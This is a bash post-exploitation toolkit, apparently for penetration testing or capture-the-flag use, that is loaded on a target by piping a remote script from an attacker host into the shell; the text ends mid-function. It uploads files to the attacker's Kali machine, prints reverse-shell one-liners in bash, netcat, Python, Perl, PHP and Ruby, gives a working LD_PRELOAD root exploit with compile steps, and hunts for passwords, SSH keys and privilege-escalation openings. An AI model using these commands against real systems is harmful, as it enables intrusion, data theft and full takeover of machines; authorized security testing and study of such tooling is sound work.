#!/bin/bash
#
# . <(curl 10.10.10.10/recon.sh)
#
# Enhanced version with full Linux privesc methodology

IP_KALI="{IP_KALI}"

#------------------------------------------------------
#  * Available functions *
#-------------------------------------------------------
function recon.help(){
    banner
    echo """
 [*] Environment:
    - recon.deploy                    : Deploy ENHANCED pentesting toolkit

 [*] Quick Transfer:
    - aux.upload [file]               : Send files to http server via POST
    - aux.download [file]             : GET file from Kali

 [*] Quick Recon (lightweight):
    - recon.sys                       : Quick system info
    - recon.net                       : Quick network info
    - recon.users                     : Local user information
    - recon.process                   : Current processes
    - recon.programs                  : Recent installed packages (Debian/Ubuntu)

 [*] Time-based Analysis:
    - recon.dateScan <from> <to>      : Files modified between dates
    - recon.dateLast                  : Files modified <15min ago
    - recon.dateSuspicious            : Suspicious timestamp binaries (IPPSEC)

 [*] Privilege Escalation Checks:
    - priv.quick                      : Run all quick privesc checks
    - priv.sudo                       : sudo -l analysis (ALWAYS FIRST!)
    - priv.setuid                     : SUID binaries (GTFOBins filtered)
    - priv.setgid                     : SGID binaries
    - priv.capabilities               : Capabilities
    - priv.writable                   : Writable locations (top 50)
    - priv.crontabs                   : Cron jobs
    - priv.passwords                  : Password files search
    - priv.sshkeys                    : SSH keys search
    - priv.interesting                : Interesting files (.env, configs, etc)
    - priv.services                   : Writable systemd services
    - priv.container                  : Docker/LXD group & container detection
    - priv.internal                   : Internal services (127.0.0.1 only)
    - priv.kernel                     : Kernel version & exploit hints

 [*] Network Tools:
    - recon.portscan <host> [range]   : Basic port scanner
    - recon.pingscan <subnet>         : /24 subnet ping scan
    - recon.pspy                      : Process monitor (pspy-like)

 [*] Enhanced Mode (after recon.deploy):
    Run 'recon.deploy' to unlock:
    - target.* functions with better output & more features
    - Reverse shell templates (target.rev)
    - Advanced enumeration (target.enum.full)
    - Optimized aliases (ls -lart by default)
    """
}

#------------------------------------------------------
#  * Deploy ENHANCED Environment *
#------------------------------------------------------
function recon.deploy(){
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              🎯 DEPLOYING ENHANCED TOOLKIT                    ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""

    # Detect shell
    _SHELL_TYPE="unknown"
    if [ -n "$BASH_VERSION" ]; then
        _SHELL_TYPE="bash"
    elif [ -n "$ZSH_VERSION" ]; then
        _SHELL_TYPE="zsh"
    else
        _SHELL_TYPE="sh"
    fi

    echo "[*] Detected shell: $_SHELL_TYPE"
    echo "[*] Attacker IP: $IP_KALI"
    
    export LHOST="$IP_KALI"
    export RHOST=""  # User can set this
    
    # Calculate local IP once to avoid hangs later
    _LOCAL_IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1 2>/dev/null)
    if [ -z "$_LOCAL_IP" ]; then
        _LOCAL_IP=$(ifconfig 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' 2>/dev/null)
    fi
    if [ -z "$_LOCAL_IP" ]; then
        _LOCAL_IP="unknown"
    fi
    export _LOCAL_IP

    # ==========================================
    # Enhanced Aliases (FIXED - no type checks)
    # ==========================================
    
    echo "[*] Loading aliases..."
    
    alias ls='ls -lart --color=auto --group-directories-first 2>/dev/null || ls -lart' 2>/dev/null
    alias ll='ls -lah --color=auto 2>/dev/null || ls -lah' 2>/dev/null
    alias la='ls -A --color=auto 2>/dev/null || ls -A' 2>/dev/null
    alias l='ls -CF --color=auto 2>/dev/null || ls -CF' 2>/dev/null
    
    alias ..='cd ..' 2>/dev/null
    alias ...='cd ../..' 2>/dev/null
    alias ....='cd ../../..' 2>/dev/null
    alias ~='cd ~' 2>/dev/null
    
    alias grep='grep --color=auto 2>/dev/null || grep' 2>/dev/null
    alias fgrep='fgrep --color=auto 2>/dev/null || fgrep' 2>/dev/null
    alias egrep='egrep --color=auto 2>/dev/null || egrep' 2>/dev/null
    
    alias ports='ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null || netstat -an' 2>/dev/null
    alias listening='lsof -i -P 2>/dev/null | grep LISTEN || netstat -an | grep LISTEN' 2>/dev/null
    alias psg='ps aux | grep -v grep | grep -i -e VSZ -e' 2>/dev/null
    alias psmem='ps aux | sort -nr -k 4 | head -10' 2>/dev/null
    alias pscpu='ps aux | sort -nr -k 3 | head -10' 2>/dev/null

    echo "  [+] Aliases loaded"

    # ==========================================
    # Enhanced Functions (target.*)
    # ==========================================

    # Get local IP (simplified to avoid hangs)
    target.myip() {
        if [ -n "$_LOCAL_IP" ] && [ "$_LOCAL_IP" != "unknown" ]; then
            echo "$_LOCAL_IP"
            return 0
        fi
        
        local ip=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1 2>/dev/null)
        if [ -n "$ip" ]; then
            echo "$ip"
            return 0
        fi
        
        ip=$(ifconfig 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' 2>/dev/null)
        if [ -n "$ip" ]; then
            echo "$ip"
            return 0
        fi
        
        echo "unknown"
    }

    # Enhanced download
    target.get() {
        local file="$1"
        if [ -z "$file" ]; then
            echo "Usage: target.get <file>"
            echo ""
            echo "Shortcuts available: /nc.exe /recon.ps1 /winPEAS.exe etc"
            return 1
        fi
        
        if command -v wget >/dev/null 2>&1; then
            wget "http://$LHOST/$file" -O "$(basename "$file")" && echo "[+] Downloaded: $(basename "$file")"
        elif command -v curl >/dev/null 2>&1; then
            curl "http://$LHOST/$file" -o "$(basename "$file")" && echo "[+] Downloaded: $(basename "$file")"
        else
            echo "[!] No wget/curl. Alternative methods:"
            echo ""
            echo "Python3:"
            echo "  python3 -c \"import urllib.request;urllib.request.urlretrieve('http://$LHOST/$file','$(basename "$file")')\""
            echo ""
            echo "Python2:"
            echo "  python -c \"import urllib;urllib.urlretrieve('http://$LHOST/$file','$(basename "$file")')\""
            return 1
        fi
    }

    # Enhanced upload
    target.put() {
        local file="$1"
        if [ -z "$file" ]; then
            echo "Usage: target.put <file>"
            return 1
        fi
        
        local name=$(basename "$file")
        
        if command -v curl >/dev/null 2>&1; then
            curl -sS -X POST \
                -H "Content-Disposition: attachment; filename=${name}" \
                --data-binary @"$file" "http://$LHOST/" && echo "[+] Uploaded: $name"
        elif command -v wget >/dev/null 2>&1; then
            wget --post-file="$file" -O /dev/null \
                --header="Content-Disposition: attachment; filename=$name" \
                "http://$LHOST/" && echo "[+] Uploaded: $name"
        else
            echo "[!] No curl/wget. Manual method:"
            echo "  [Target]  nc $LHOST 9999 < $file"
            echo "  [Kali]    nc -lvnp 9999 > $name"
            return 1
        fi
    }

    # Reverse shell templates
    target.rev() {
        local port="${1:-4444}"
        cat << 'REVEOF'

╔══════════════════════════════════════════════════════════════╗
║              🐚 REVERSE SHELL TEMPLATES                       ║
╚══════════════════════════════════════════════════════════════╝
REVEOF
        echo ""
        echo "Target connects to: $LHOST:$port"
        echo ""
        echo "┌─ Bash ────────────────────────────────────────────────────────┐"
        echo "│ bash -c 'bash -i >& /dev/tcp/$LHOST/$port 0>&1'               │"
        echo "│ bash -c 'bash -i >& /dev/udp/$LHOST/$port 0>&1'               │"
        echo "└───────────────────────────────────────────────────────────────┘"
        echo ""
        echo "┌─ Netcat ──────────────────────────────────────────────────────┐"
        echo "│ nc -e /bin/bash $LHOST $port                                  │"
        echo "│ nc -e /bin/sh $LHOST $port                                    │"
        echo "│ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $LHOST $port>/tmp/f │"
        echo "│ busybox nc $LHOST $port -e /bin/sh                            │"
        echo "└───────────────────────────────────────────────────────────────┘"
        echo ""
        echo "┌─ Python ──────────────────────────────────────────────────────┐"
        echo "│ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        echo "│"
        echo "│ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        echo "└───────────────────────────────────────────────────────────────┘"
        echo ""
        echo "┌─ Others ──────────────────────────────────────────────────────┐"
        echo "│ Perl:"
        echo "│   perl -e 'use Socket;\$i=\"$LHOST\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        echo "│"
        echo "│ PHP:"
        echo "│   php -r '\$sock=fsockopen(\"$LHOST\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo "│"
        echo "│ Ruby:"
        echo "│   ruby -rsocket -e'f=TCPSocket.open(\"$LHOST\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        echo "└───────────────────────────────────────────────────────────────┘"
        echo ""
    }

    # Enhanced system info - FIXED
    target.sys() {
        echo ""
        echo "╔══════════════════════════════════════════════════════════════╗"
        echo "║              💻 SYSTEM INFORMATION                            ║"
        echo "╚══════════════════════════════════════════════════════════════╝"
        echo ""
        echo "Hostname:     $(hostname 2>/dev/null || echo 'unknown')"
        echo "Kernel:       $(uname -r 2>/dev/null || echo 'unknown')"
        
        # OS detection - fixed to avoid /etc/issue escape codes
        local os_name=""
        if [ -f /etc/os-release ]; then
            os_name=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2)
        fi
        if [ -z "$os_name" ] && [ -f /etc/issue ]; then
            os_name=$(head -1 /etc/issue 2>/dev/null | sed 's/\\[a-z]//g' | sed 's/  */ /g' | xargs 2>/dev/null)
        fi
        echo "OS:           ${os_name:-unknown}"
        
        echo "Architecture: $(uname -m 2>/dev/null || echo 'unknown')"
        echo "Current User: $(whoami 2>/dev/null || echo 'unknown') (UID: $(id -u 2>/dev/null), GID: $(id -g 2>/dev/null))"
        echo "Groups:       $(groups 2>/dev/null | tr ' ' ', ')"
        echo "Shell:        $_SHELL_TYPE ($SHELL)"
        echo "Uptime:       $(uptime -p 2>/dev/null || uptime 2>/dev/null | cut -d',' -f1 || echo 'unknown')"
        echo ""
        
        # CPU - fixed xargs hang
        local cpu_model=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d':' -f2 | sed 's/^[ \t]*//' | head -c 60)
        [ -z "$cpu_model" ] && cpu_model=$(cat /proc/cpuinfo 2>/dev/null | grep -i "^model" | head -1 | cut -d':' -f2)
        echo "CPU:          ${cpu_model:-unknown}"
        echo "CPU Cores:    $(grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo 'unknown')"
        echo ""
        
        echo "Memory:"
        free -h 2>/dev/null || free -m 2>/dev/null || cat /proc/meminfo 2>/dev/null | head -3
        echo ""
        
        echo "Disk Usage (Top 5):"
        df -h 2>/dev/null | head -6 || df 2>/dev/null | head -6
        echo ""
        
        # Sudo - with timeout to prevent hang
        local sudo_ver="N/A"
        if command -v timeout >/dev/null 2>&1; then
            sudo_ver=$(timeout 2 sudo -V 2>/dev/null | head -1)
        else
            sudo_ver=$(sudo -V 2>&1 | head -1)
        fi
        echo "Sudo Version: ${sudo_ver:-N/A}"
    }

    # Enhanced network info
    target.net() {
        echo ""
        echo "╔══════════════════════════════════════════════════════════════╗"
        echo "║              🌐 NETWORK INFORMATION                           ║"
        echo "╚══════════════════════════════════════════════════════════════╝"
        echo ""
        echo "=== Interfaces ==="
        if command -v ip >/dev/null 2>&1; then
            ip -br addr 2>/dev/null || ip addr show
        elif command -v ifconfig >/dev/null 2>&1; then
            ifconfig -a | grep -E "^[a-z]|inet "
        else
            cat /proc/net/dev 2>/dev/null
        fi
        
        echo ""
        echo "=== Routes ==="
        if command -v ip >/dev/null 2>&1; then
            ip route
        elif command -v route >/dev/null 2>&1; then
            route -n
        else
            cat /proc/net/route 2>/dev/null
        fi
        
        echo ""
        echo "=== Listening Ports ==="
        if command -v ss >/dev/null 2>&1; then
            ss -tulnp
        elif command -v netstat >/dev/null 2>&1; then
            netstat -tulnp 2>/dev/null || netstat -an | grep LISTEN
        fi
        
        echo ""
        echo "=== ARP Table ==="
        if command -v ip >/dev/null 2>&1; then
            ip neigh
        elif command -v arp >/dev/null 2>&1; then
            arp -a
        else
            cat /proc/net/arp 2>/dev/null
        fi
        
        echo ""
        echo "=== DNS ==="
        cat /etc/resolv.conf 2>/dev/null
    }

    # FULL enumeration
    target.enum.full() {
        echo ""
        echo "╔══════════════════════════════════════════════════════════════╗"
        echo "║              🔍 FULL ENUMERATION                              ║"
        echo "╚══════════════════════════════════════════════════════════════╝"
        echo ""
        
        echo "[1/14] System enumeration..."
        target.sys
        
        echo ""
        echo "[2/14] Network enumeration..."
        target.net
        
        echo ""
        echo "[3/14] sudo -l (MOST IMPORTANT!)..."
        priv.sudo
        
        echo ""
        echo "[4/14] SUID binaries..."
        priv.setuid
        
        echo ""
        echo "[5/14] SGID binaries..."
        priv.setgid
        
        echo ""
        echo "[6/14] Capabilities..."
        priv.capabilities
        
        echo ""
        echo "[7/14] Writable locations..."
        priv.writable | head -30
        
        echo ""
        echo "[8/14] Cron jobs..."
        priv.crontabs | head -40
        
        echo ""
        echo "[9/14] Interesting files..."
        priv.interesting | head -40
        
        echo ""
        echo "[10/14] Password files..."
        priv.passwords | head -30
        
        echo ""
        echo "[11/14] SSH keys..."
        priv.sshkeys
        
        echo ""
        echo "[12/14] Systemd services..."
        priv.services
        
        echo ""
        echo "[13/14] Container/Docker/LXD..."
        priv.container
        
        echo ""
        echo "[14/14] Kernel exploits..."
        priv.kernel
        
        echo ""
        echo "[+] Full enumeration complete!"
        echo ""
        echo "=== QUICK CHECKLIST ==="
        echo "[ ] sudo -l → Check GTFOBins for any allowed commands"
        echo "[ ] SUID/SGID → Check GTFOBins"
        echo "[ ] Capabilities → Check GTFOBins"
        echo "[ ] Cron jobs → Look for writable scripts or PATH hijack"
        echo "[ ] /etc/passwd writable → Add root user"
        echo "[ ] Docker/LXD group → Container escape"
        echo "[ ] Kernel version → searchsploit linux kernel <version>"
    }

    # Port scanner (FIXED - added timeout and progress)
    target.portscan() {
        local host="$1"
        local ports="${2:-1-1000}"
        
        if [ -z "$host" ]; then
            echo "Usage: target.portscan <host> [port_range]"
            echo "Example: target.portscan 192.168.1.1 20-25"
            return 1
        fi
        
        local start=$(echo $ports | cut -d'-' -f1)
        local end=$(echo $ports | cut -d'-' -f2)
        
        echo ""
        echo "╔══════════════════════════════════════════════════════════════╗"
        echo "║              📡 PORT SCAN: $host"
        echo "╚══════════════════════════════════════════════════════════════╝"
        echo ""
        echo "Scanning ports $start-$end..."
        echo ""
        
        if [ "$_SHELL_TYPE" = "bash" ]; then
            local port=$start
            local open_ports=""
            local total=$((end - start + 1))
            local progress=0
            
            while [ $port -le $end ]; do
                timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && {
                    echo "  [+] $port/tcp open"
                    open_ports="$open_ports$port,"
                }
                
                progress=$((progress + 1))
                if [ $((progress % 100)) -eq 0 ]; then
                    echo "  [*] Progress: $progress/$total ports scanned..."
                fi
                
                port=$((port + 1))
            done
            
            echo ""
            [ -n "$open_ports" ] && echo "Open ports: ${open_ports%,}" || echo "No open ports found"
        else
            if command -v nc >/dev/null 2>&1; then
                local port=$start
                while [ $port -le $end ]; do
                    nc -zv -w1 $host $port 2>&1 | grep -q succeeded && echo "  [+] $port/tcp open"
                    port=$((port + 1))
                done
            else
                echo "[!] Port scanning requires bash with /dev/tcp or netcat"
            fi
        fi
    }

    # Help
    target.help() {
        cat << 'HELPEOF'

╔══════════════════════════════════════════════════════════════╗
║           🎯 ENHANCED PENTESTING FUNCTIONS                    ║
╚══════════════════════════════════════════════════════════════╝

Transfer (Enhanced):
  target.get <file>         → Download from Kali (with shortcuts)
  target.put <file>         → Upload to Kali (POST method)

Shells:
  target.rev [port]         → Reverse shell templates (formatted)

Enumeration (Enhanced):
  target.sys                → Full system info (better formatting)
  target.net                → Full network info (concise output)
  target.myip               → Show local IP
  target.enum.full          → Run ALL enumerations at once

Privilege Escalation (Full Methodology):
  priv.sudo                 → sudo -l (ALWAYS FIRST!)
  priv.setuid               → SUID binaries (GTFOBins filtered)
  priv.setgid               → SGID binaries
  priv.capabilities         → Capabilities
  priv.writable             → Writable locations
  priv.crontabs             → Cron jobs
  priv.interesting          → Interesting files (.env, configs)
  priv.passwords            → Password files
  priv.sshkeys              → SSH keys
  priv.services             → Writable systemd services
  priv.container            → Docker/LXD detection
  priv.internal             → Internal services (127.0.0.1)
  priv.kernel               → Kernel exploit hints
  priv.quick                → Quick privesc checks

Network:
  target.portscan <h> [p]   → Port scanner (enhanced output)

Aliases (Auto-loaded):
  ls                        → ls -lart --color (default now!)
  ll, la, l                 → Various ls shortcuts
  .., ..., ....             → Quick navigation
  ports, listening          → Network status
  psg, psmem, pscpu         → Process info

HELPEOF
        echo "Attacker IP: $LHOST"
        echo "Local IP:    ${_LOCAL_IP:-unknown}"
        echo "Shell Type:  $_SHELL_TYPE"
        echo ""
        echo "TIP: Run 'target.enum.full' for complete enumeration"
        echo ""
    }

    # ==========================================
    # Function Export (bash/zsh only)
    # ==========================================
    if [ "$_SHELL_TYPE" = "bash" ] || [ "$_SHELL_TYPE" = "zsh" ]; then
        if [ "$_SHELL_TYPE" = "bash" ]; then
            export -f target.rev target.get target.put target.sys target.net \
                      target.help target.myip target.portscan target.enum.full 2>/dev/null
        fi
    fi

    echo ""
    echo "[+] Enhanced toolkit deployed!"
    echo "[+] Functions available: target.* and priv.*"
    echo "[+] Run 'target.help' for full list"
    echo ""
    echo "⚠️  REMEMBER: Always run 'priv.sudo' first!"
    echo ""
}

#------------------------------------------
#  *   Upload files via http POST  *
#------------------------------------------
function aux.upload {
    if [[ $# -ne 1  ]]; then
        echo "Usage: aux.upload <file>"
        echo ""
        echo "TIP: After 'recon.deploy', use 'target.put' for enhanced version"
        return
    fi
    filename=$(basename "$1")
    
    if command -v curl >/dev/null 2>&1; then
        curl -sS -X POST \
            -H "Content-Disposition: attachment; filename=${filename}" \
            --data-binary @"$1" "$IP_KALI" && echo "[+] Uploaded: $filename"
    elif command -v wget >/dev/null 2>&1; then
        wget --post-file=$1 -O /dev/null \
            --header="Content-Disposition: attachment; filename=$filename" \
            "$IP_KALI" && echo "[+] Uploaded: $filename"
    else
        echo "[!] No curl/wget available"
    fi
}

#------------------------------------------
#  * Download files via http GET *
#------------------------------------------
function aux.download {
    if [[ $# -ne 1  ]]; then
        echo "Usage: aux.download <file>"
        echo ""
        echo "TIP: After 'recon.deploy', use 'target.get' for enhanced version"
        return
    fi
    
    if command -v wget >/dev/null 2>&1; then
        wget "$IP_KALI/$1"
    elif command -v curl >/dev/null 2>&1; then
        curl -O "$IP_KALI/$1"
    else
        echo "[!] No wget/curl available"
    fi
}

#------------------------------------------
#  * Quick System Info (lightweight) *
#------------------------------------------
function recon.sys {
    echo ""
    echo "=== Quick System Info ==="
    echo "Hostname: $(hostname)"
    echo "Kernel:   $(uname -r)"
    local os_name=""
    if [ -f /etc/os-release ]; then
        os_name=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2)
    fi
    if [ -z "$os_name" ] && [ -f /etc/issue ]; then
        os_name=$(head -1 /etc/issue 2>/dev/null | sed 's/\\[a-z]//g' | sed 's/  */ /g')
    fi
    echo "OS:       ${os_name:-unknown}"
    echo "User:     $(whoami) (UID: $(id -u))"
    echo "Groups:   $(groups 2>/dev/null)"
    echo ""
    echo "TIP: Run 'recon.deploy' then 'target.sys' for detailed info"
}

#------------------------------------------
#  * Quick Network Info (lightweight) *
#------------------------------------------
function recon.net {
    echo ""
    echo "=== Quick Network Info ==="
    echo ""
    echo "Interfaces:"
    ip -br addr 2>/dev/null || ifconfig -a 2>/dev/null | grep -E "^[a-z]|inet " || cat /proc/net/dev
    echo ""
    echo "Listening:"
    ss -tulnp 2>/dev/null | head -10 || netstat -tuln 2>/dev/null | head -10
    echo ""
    echo "TIP: Run 'recon.deploy' then 'target.net' for full details"
}

#------------------------------------------
#  User Information
#------------------------------------------
function recon.users {
    echo ""
    echo "=== Users with Shell ==="
    grep -E '/bin/(bash|sh|zsh|fish)' /etc/passwd 2>/dev/null
    echo ""
    echo "=== Active System Users (UID >= 1000) ==="
    while IFS=: read -r username _ uid _ _ hom term; do
        if [ "$uid" -ge 1000 ] 2>/dev/null && [ "$uid" -ne 65534 ] 2>/dev/null; then
            echo "  $username → Home: $hom, Shell: $term"
            echo "    Groups: $(groups $username 2>/dev/null | cut -d':' -f2)"
        fi
    done < /etc/passwd
    echo ""
    echo "=== Currently Logged In ==="
    w 2>/dev/null || who 2>/dev/null
    echo ""
    echo "=== Last Logins ==="
    last 2>/dev/null | head -10
}

#------------------------------------------
#  Recently Installed Packages (Debian/Ubuntu)
#------------------------------------------
function recon.programs {
    echo ""
    echo "=== Last 50 Installed Packages ==="
    grep " install " /var/log/dpkg.log* 2>/dev/null | sed 's/^[^:]*://g' | sort | tail -n50
}

#------------------------------------------
#  Current Processes
#------------------------------------------
function recon.process {
    echo ""
    echo "=== Current Processes ==="
    ps auxf 2>/dev/null | grep -vE "\[.*\]" | cut -c 1-$(tput cols 2>/dev/null || echo 120) || ps aux
}

#------------------------------------------
#  Search files modified <15min
#------------------------------------------
function recon.dateLast(){
    echo ""
    echo "=== Files Modified <15min ==="
    find / -type f -mmin -15 -exec ls -la {} \; 2>/dev/null | grep -v proc
}

#------------------------------------------
#  Search files between dates
#------------------------------------------
function recon.dateScan(){
    if [[ $# -ne 2  ]]; then
        echo "Usage: recon.dateScan <from_date> <to_date>"
        echo "Example: recon.dateScan 2020-01-01 2020-02-01"
        return
    fi

    dat1=$1
    dat2=$(date --date="$dat1 + 1 day" +"%Y-%m-%d" 2>/dev/null)
    
    if [ -z "$dat2" ]; then
        echo "[!] Date calculation failed. Check 'date' command availability"
        return 1
    fi

    while [[ "$dat1" < "$2" ]];do
        echo ""
        echo "=== $dat1 <-> $dat2 ==="
        find / -type f -newermt $dat1 ! -newermt $dat2 -exec ls -la {} \; 2>/dev/null
        dat1=$dat2
        dat2=$(date --date="$dat1 + 1 day" +"%Y-%m-%d")
    done
}

#------------------------------------------
#  Suspicious timestamp binaries
#------------------------------------------
function recon.dateSuspicious(){
    echo ""
    echo "=== Executables with Suspicious Timestamps ==="
    for i in $(echo $PATH | tr ":" "\n"); do 
        ls -la --time-style=full $i 2>/dev/null | grep -v "000000\|->"
    done
}

#------------------------------------------
#  Port Scanner (basic) - IMPROVED
#------------------------------------------
function recon.portscan() {
    local ip=$1
    local port_range=${2:-"1-1024"}

    if [ -z "$ip" ]; then
        echo "Usage: recon.portscan <host> [port_range]"
        echo "Example: recon.portscan 192.168.1.1 20-25"
        echo ""
        echo "TIP: After 'recon.deploy', use 'target.portscan' for better output"
        return
    fi

    IFS='-' read -r start_port end_port <<< "$port_range"
    
    echo ""
    echo "=== Scanning $ip:$start_port-$end_port ==="

    if command -v timeout >/dev/null 2>&1; then
        for port in $(seq "$start_port" "$end_port"); do
            timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "  [+] Port $port is open"
        done
    else
        for port in $(seq "$start_port" "$end_port"); do
            (echo >/dev/tcp/$ip/$port) 2>/dev/null && echo "  [+] Port $port is open"
        done
    fi
}

#------------------------------------------
#  Ping Scan /24 - IMPROVED
#------------------------------------------
function recon.pingscan() {
    local ip=$1

    if [ -z "$ip" ]; then
        echo "Usage: recon.pingscan <subnet_prefix>"
        echo "Example: recon.pingscan 192.168.0"
        return
    fi

    echo ""
    echo "=== Ping Scan: ${ip}.0/24 ==="
    
    local count=0
    for i in {1..254}; do
        current_ip="$ip.$i"
        (ping -c 1 -W 1 "$current_ip" &>/dev/null && echo "  [+] $current_ip is up") &
        
        count=$((count + 1))
        if [ $count -ge 20 ]; then
            wait
            count=0
        fi
    done
    wait
}

#------------------------------------------
#  Process monitor (pspy-like) - IMPROVED
#------------------------------------------
function recon.pspy() {
    echo ""
    echo "=== Monitoring New Processes (Ctrl+C to stop) ==="
    
    local tmp1="/tmp/.pspy1_$$"
    local tmp2="/tmp/.pspy2_$$"
    
    trap "rm -f $tmp1 $tmp2 2>/dev/null" EXIT INT TERM
    
    ps -eo command --sort=start_time 2>/dev/null | grep -vE "\[.*\]" | grep -v tail > "$tmp1"
    
    while true; do
        sleep 0.5
        ps -eo command --sort=start_time 2>/dev/null | grep -vE "\[.*\]" | grep -v tail > "$tmp2"
        diff "$tmp1" "$tmp2" 2>/dev/null | grep "^>" | sed 's/^> //'
        mv "$tmp2" "$tmp1" 2>/dev/null
    done
}

#======================================================
#  PRIVILEGE ESCALATION CHECKS
#======================================================

#------------------------------------------
#  sudo -l - THE MOST IMPORTANT CHECK!
#------------------------------------------
function priv.sudo() {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              🔑 SUDO PERMISSIONS (CHECK FIRST!)               ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    # Check if we can run sudo -l without password
    echo "=== sudo -l ==="
    local sudo_output=$(timeout 5 sudo -nl 2>&1)
    
    if echo "$sudo_output" | grep -q "password"; then
        echo "[!] sudo requires password"
        echo ""
        echo "Try: sudo -l (if you know the password)"
    else
        echo "$sudo_output"
    fi
    
    echo ""
    
    # Check for LD_PRELOAD
    if echo "$sudo_output" | grep -qi "LD_PRELOAD"; then
        echo -e "\033[1;31m[!!!] LD_PRELOAD FOUND - EASY ROOT!\033[0m"
        echo ""
        echo "Exploit:"
        echo "1. Create shell.c:"
        echo '   #include <stdio.h>'
        echo '   #include <sys/types.h>'
        echo '   #include <stdlib.h>'
        echo '   void _init() {'
        echo '       unsetenv("LD_PRELOAD");'
        echo '       setgid(0); setuid(0);'
        echo '       system("/bin/bash");'
        echo '   }'
        echo ""
        echo "2. Compile: gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles"
        echo "3. Run: sudo LD_PRELOAD=/tmp/shell.so <any_allowed_command>"
        echo ""
    fi
    
    # Check for env_keep
    if echo "$sudo_output" | grep -qi "env_keep"; then
        echo -e "\033[1;33m[!] env_keep found - check for exploitable variables\033[0m"
        echo ""
    fi
    
    # Check for NOPASSWD
    if echo "$sudo_output" | grep -qi "NOPASSWD"; then
        echo -e "\033[1;32m[+] NOPASSWD entries found!\033[0m"
        echo ""
    fi
    
    # GTFOBins common binaries
    local gtfo_binaries="vim vi nano less more awk nmap find python python3 perl ruby bash sh env tar zip git ftp nc ncat socat ssh scp rsync wget curl"
    
    for bin in $gtfo_binaries; do
        if echo "$sudo_output" | grep -qiE "(^|/)$bin(\s|$)"; then
            echo -e "\033[1;31m[!!!] GTFOBins: $bin found! Check https://gtfobins.github.io/gtfobins/$bin/#sudo\033[0m"
        fi
    done
    
    echo ""
    echo "Reference: https://gtfobins.github.io/"
}

#------------------------------------------
#  Quick privesc check (runs all)
#------------------------------------------
function priv.quick() {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              🚀 QUICK PRIVESC CHECKS                          ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    echo "[1/10] sudo -l (MOST IMPORTANT!)..."
    priv.sudo
    echo ""
    
    echo "[2/10] SUID binaries..."
    priv.setuid | head -25
    echo ""
    
    echo "[3/10] SGID binaries..."
    priv.setgid | head -15
    echo ""
    
    echo "[4/10] Capabilities..."
    priv.capabilities
    echo ""
    
    echo "[5/10] Writable locations..."
    priv.writable | head -20
    echo ""
    
    echo "[6/10] Cron jobs..."
    priv.crontabs | head -30
    echo ""
    
    echo "[7/10] Container/Docker/LXD..."
    priv.container
    echo ""
    
    echo "[8/10] Interesting files..."
    priv.interesting | head -25
    echo ""
    
    echo "[9/10] SSH keys..."
    priv.sshkeys
    echo ""
    
    echo "[10/10] Kernel exploits..."
    priv.kernel
    echo ""
    
    echo "[+] Quick checks complete!"
    echo ""
    echo "=== REMEMBER THE CHECKLIST ==="
    echo "[ ] sudo -l → GTFOBins"
    echo "[ ] SUID/SGID → GTFOBins"
    echo "[ ] Capabilities → GTFOBins"
    echo "[ ] Cron jobs → Writable scripts? PATH hijack?"
    echo "[ ] /etc/passwd writable → Add root user"
    echo "[ ] Docker/LXD group → Container escape"
    echo "[ ] Kernel → searchsploit"
}

#------------------------------------------
#  SETUID Programs
#------------------------------------------
function priv.setuid {
    local keywords=("nmap" "vim" "vi" "find" "bash" "sh" "more" "less" "nano" "cp" "mv" "awk" 
              "python" "python3" "perl" "ruby" "lua" "php" "gcc" "gdb" "node" "curl" "wget" 
              "tar" "zip" "unzip" "busybox" "env" "docker" "git" "ssh" "nc" "ncat"
              "pkexec" "doas" "run-parts" "start-stop-daemon" "systemctl")
    
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              ⚙️ SUID BINARIES                                  ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    local setuids=$(find / -perm -4000 -type f ! -path "/dev/*" ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null)
    
    if [ -z "$setuids" ]; then
        echo "[!] No SUID binaries found or insufficient permissions"
        return
    fi
    
    echo "$setuids" | while IFS= read -r binary; do
        local binary_name=$(basename "$binary")
        local interesting=0
        for keyword in "${keywords[@]}"; do
